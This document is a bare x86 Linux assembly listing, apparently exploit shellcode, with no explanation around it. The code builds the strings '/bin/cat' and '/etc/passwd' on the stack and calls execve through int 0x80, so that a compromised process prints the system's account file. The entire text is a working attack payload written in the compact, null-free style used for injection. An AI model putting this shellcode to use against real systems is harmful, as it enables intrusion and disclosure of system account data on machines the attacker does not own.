global _start
_start:
    xor    edx,edx
    mul    edx
    push   eax
    push   0x7461632f
    push   0x6e69622f
    mov    ebx,esp
    push   eax
    mov    dword [esp-8], 0x61702f2f
    mov    dword [esp-4], 0x64777373
    sub    esp, 8
    push   0x2f2f2f2f
    push   0x6374652f
    mov    ecx,esp
    push   eax
    push   ecx
    push   ebx
    inc    eax
    xor    al, 0xa
    mov    ecx,esp
    int    0x80